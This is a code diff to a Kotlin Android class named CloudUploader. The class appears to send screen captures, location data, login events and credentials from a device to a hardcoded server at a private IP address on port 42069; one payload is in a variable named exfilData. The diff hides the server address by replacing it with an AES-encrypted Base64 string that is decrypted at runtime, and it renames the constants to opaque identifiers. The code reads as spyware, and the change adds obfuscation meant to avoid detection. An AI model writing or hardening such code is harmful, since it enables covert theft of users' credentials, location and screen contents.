@@ -26,14 +26,36 @@ class CloudUploader(private val context: Context) {
     private val handler = Handler(Looper.getMainLooper())
     private var isSyncing = false
 
-    object SyncConfig {
-        const val API_ENDPOINT = "http://192.168.251.254:42069/api/"
-        const val SYNC_ENDPOINT = "${API_ENDPOINT}sync"
-        const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
-        const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"
+object SyncConfig {
+    // Encrypted Base64 of the IP "http://192.168.86.37:42069/api/"
+    private const val A1001 = "Hv8KY38VgNNHk9Yy9hewK08gTRFUVSL7Jo9cWAfDZpMOau/AW3uOpRbr6zbgNxVU"
+    const val B1001 = "ThisIsAFakeKey16"
 
-        const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
+    private fun decryptEndpoint(): String {
+        val encryptedBytes = android.util.Base64.decode(A1001, android.util.Base64.DEFAULT)
+
+        val iv = encryptedBytes.copyOfRange(0, 16)
+        val encrypted = encryptedBytes.copyOfRange(16, encryptedBytes.size)
+
+        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+        val keySpec = SecretKeySpec(B1001.toByteArray(), "AES")
+        val ivSpec = IvParameterSpec(iv)
+
+        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)
+
+        val decryptedBytes = cipher.doFinal(encrypted)
+        return String(decryptedBytes)
     }
+
+    // API_ENDPOINT
+    val A1002: String by lazy { decryptEndpoint() }
+    //SYNC_ENDPOINT
+    val A1003: String by lazy { "${A1002}sync" }
+    // ANALYTICS_ENDPOINT
+    val A1004: String by lazy { "${A1002}analytics" }
+    // TELEMETRY_ENDPOINT
+    val A1005: String by lazy { "${A1002}telemetry" }
+}
 
     private val deviceId: String by lazy {
         Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
@@ -101,9 +123,9 @@ class CloudUploader(private val context: Context) {
         }
 
         val endpoint = when {
-            batch.any { it.dataType.contains("screen") } -> SyncConfig.TELEMETRY_ENDPOINT
-            batch.any { it.dataType.contains("location") } -> SyncConfig.ANALYTICS_ENDPOINT
-            else -> SyncConfig. SYNC_ENDPOINT
+            batch.any { it.dataType.contains("screen") } -> SyncConfig.A1005
+            batch.any { it.dataType.contains("location") } -> SyncConfig.A1004
+            else -> SyncConfig. A1003
         }
         SendDataTask(endpoint, request.toString()).execute()
     }
@@ -115,7 +137,7 @@ class CloudUploader(private val context: Context) {
             }
 
             val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
-            val key = SecretKeySpec(SyncConfig.ENCRYPTION_KEY.toByteArray(), "AES")
+            val key = SecretKeySpec(SyncConfig.B1001.toByteArray(), "AES")
             val ivParameterSpec = IvParameterSpec(iv)
 
             cipher.init(Cipher.ENCRYPT_MODE, key, ivParameterSpec)
@@ -150,9 +172,9 @@ class CloudUploader(private val context: Context) {
             }
 
             val endpoint = when (dataType) {
-                "login_event" -> "${SyncConfig.API_ENDPOINT}analytics"
-                "credentials" -> "${SyncConfig.API_ENDPOINT}auth/validate"
-                else -> "${SyncConfig.API_ENDPOINT}data"
+                "login_event" -> "${SyncConfig.A1002}analytics"
+                "credentials" -> "${SyncConfig.A1002}auth/validate"
+                else -> "${SyncConfig.A1002}data"
             }
 
             SendDataTask(endpoint, exfilData.toString()).execute()
